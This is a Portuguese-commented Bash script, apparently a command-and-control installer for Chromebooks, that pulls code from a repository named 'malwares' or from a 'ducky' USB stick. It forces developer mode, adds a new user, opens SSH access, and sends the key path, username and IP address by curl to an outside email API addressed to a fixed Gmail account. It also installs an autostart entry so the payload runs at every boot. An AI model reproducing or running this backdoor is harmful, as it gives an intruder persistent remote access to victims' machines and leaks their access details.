#!/bin/bash

# Antes de iniciar:
# chmod +x CNC_chrome.sh

# Verifica se o script está sendo executado como root
if [[ $EUID -ne 0 ]]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

# Função para habilitar o modo de desenvolvedor no Chromebook
habilitar_modo_desenvolvedor() {
  if [ ! -f "/tmp/mode_dev_enabled" ]; then
    echo "Habilitando o modo de desenvolvedor..."
    sudo chromeos-firmwareupdate --mode=todev || {
      echo "O comando para habilitar o modo de desenvolvedor não foi aceito."
      echo "Por favor, siga o procedimento abaixo para habilitar o modo de desenvolvedor manualmente:"
      echo
      echo "1. Desligue o Chromebook."
      echo "2. Pressione e segure as teclas Esc + Refresh (normalmente é a quarta tecla na fileira superior com uma seta circular) no teclado."
      echo "3. Enquanto mantém essas teclas pressionadas, pressione o botão de ligar para ligar o Chromebook."
      echo "4. Solte as teclas quando você ver a tela de recuperação."
      echo "5. A partir daqui, use as teclas de seta para navegar até as opções avançadas e pressione Enter."
      echo "6. Na próxima tela, selecione 'Enable Developer Mode' e pressione Enter."
      echo "7. Na última tela, pressione 'Confirm'."
      echo
      read -n 1 -s -r -p "Pressione qualquer tecla quando terminar o procedimento de habilitação do modo de desenvolvedor..."
      echo
    }
    sudo touch "/tmp/mode_dev_enabled"
    sudo shutdown now
    exit 0
  fi
}

# Antes de iniciar este comando: chmod +x start.sh
# Instalação do Python e dependências
apt update
apt install -y git
apt install -y python3 python3-pip python3-venv git
apt install -y openssh-server

# Verificar se o pendrive "ducky" está conectado
detectar_pendrive_ducky() {
  if ls /media/removable/ducky* 1> /dev/null 2>&1; then
    echo "Pendrive 'ducky' encontrado."
    return 0
  else
    echo "Pendrive 'ducky' não encontrado."
    return 1
  fi
}

# Função para fazer o clone do repositório do Git
git_clone_repositorio() {
  echo "Clonando repositório 'https://www.github.com/efraim-lima/malwares'..."
  cd ~
  git clone https://www.github.com/efraim-lima/malwares
  chmod +x ~/malwares/tools/CNC/CNC.sh
  sudo touch "/tmp/git_clonado"
  sudo reboot
  exit 0
}

# Função para montar o pendrive e copiar os scripts para o Chromebook
copiar_scripts_pendrive() {
  if [ ! -f "/tmp/scripts_copiados" ]; then
    echo "Montando o pendrive..."
    PENDRIVE_DIR="/media/removable/$(ls /media/removable/)"
    mkdir -p ~/scripts
    cp "$PENDRIVE_DIR/CNC.sh" ~/scripts/
    chmod +x ~/scripts/CNC.sh
    sudo touch "/tmp/scripts_copiados"
    sudo reboot
    exit 0
  fi
}

# Função para executar o script CNC.sh
executar_script_tunnel_local() {
  echo "Executando o script CNC.sh..."
  ~/scripts/CNC.sh
}

# Configurações do primeiro script
venv_name="chrome"
venv_dir="./chrome/venv"
python_executable="python3"
username=$(whoami)
usernameb="play"
repository_url="https://www.github.com/efraim-lima/malwares"
relative_path="./modules/play.py"
install_directory="/chrome"
ssh_port="22" # Porta SSH (padrão é 22)
ssh_dir="/home/$username/.ssh"
ssh_key="$ssh_dir/id_rsa"
output_file="ssh_info.txt"
app_name="My Python App"

# Execução das funções do primeiro script
habilitar_modo_desenvolvedor

detectar_pendrive_ducky
if [ $? -eq 0 ]; then
  copiar_scripts_pendrive
else
  # Verificar se o repositório do Git já foi clonado
  if [ ! -f "/tmp/git_clonado" ]; then
    git_clone_repositorio
  else
    executar_script_tunnel_local
  fi
fi

# Criação de um novo usuário do primeiro script
useradd -m -s /bin/bash $usernameb
passwd $usernameb

# Define as permissões corretas para a chave do primeiro script
chown -R $username:$username $ssh_dir
chmod 700 $ssh_dir
chmod 600 $ssh_key*

# Configuração do acesso remoto via SSH do primeiro script
sed -i "s/#Port 22/Port $ssh_port/" /etc/ssh/sshd_config
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
echo "AllowUsers $usernameb" >> /etc/ssh/sshd_config

# Reinicia o serviço SSH do primeiro script
systemctl restart ssh

# Exporta informações para o arquivo de saída do primeiro script
output_path="/home/$username/$output_file"
echo "Chave SSH: $ssh_key" > $output_path
echo "Nome de usuário: $usernameb" >> $output_path
echo "IP da máquina: $(hostname -I)" >> $output_path

# Envia o arquivo por e-mail usando o serviço Ephemeral Email
echo "Enviando arquivo por e-mail..."
# O comando abaixo envia o conteúdo do arquivo de saída por e-mail para o endereço teste@teste.com
# Substitua o valor do campo --data "to=teste@teste.com" pelo e-mail desejado
curl -X POST "https://www.ephemeral.email/api/v1/email" \
  -H "Content-Type: application/json" \
  --data "to=efraim.alima@gmail.com" \
  --data-urlencode "body@${output_path}"

echo "Chave SSH criada com sucesso. As informações foram exportadas para o arquivo $output_file."
echo "Agora você pode acessar sua máquina remotamente via terminal usando:"
echo "ssh -p $ssh_port $usernameb@$(hostname -I)"

# Criação da chave SSH do primeiro script
mkdir -p $ssh_dir
ssh-keygen -t rsa -b 4096 -f $ssh_key -N ""

# Clone o repositório do primeiro script com permissões do usuário atual
if [ ! -d "$install_directory" ]; then
    git clone "$repository_url" "$install_directory"
else
    echo "O diretório de instalação $install_directory já existe."
fi

# Criação do ambiente virtual do primeiro script
if [ ! -d "$venv_dir" ]; then
    $python_executable -m venv "$venv_dir/$venv_name"
else
    echo "O diretório de ambiente virtual $venv_dir já existe."
fi

# Função para ativar o ambiente virtual e iniciar as aplicações do primeiro script
activate_venv_and_start_app() {
    # Ativação do ambiente virtual
    source "$venv_dir/$venv_name/bin/activate"

    # Instalação das dependências do requirements.txt (opcional)
    if [ -f "$install_directory/requirements.txt" ]; then
        pip install -r "$install_directory/requirements.txt"
    else
        echo "O arquivo requirements.txt não foi encontrado."
    fi
}

# Executa a função de ativação do ambiente virtual e início das aplicações do primeiro script
activate_venv_and_start_app

# Criação do arquivo .desktop para iniciar com o sistema do primeiro script
desktop_file="/home/$username/.config/autostart/$app_name.desktop"
tee "$desktop_file" > /dev/null <<EOT
[Desktop Entry]
Type=Application
Exec=$venv_dir/$venv_name/bin/python $relative_path
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]=$app_name
Name=$app_name
Comment[en_US]=My Python Application
Comment=My Python Application
EOT

# Define as permissões corretas para o arquivo .desktop do primeiro script
chown $username:$username $desktop_file
chmod +x $desktop_file

echo "A aplicação $app_name foi configurada para iniciar automaticamente com o sistema."
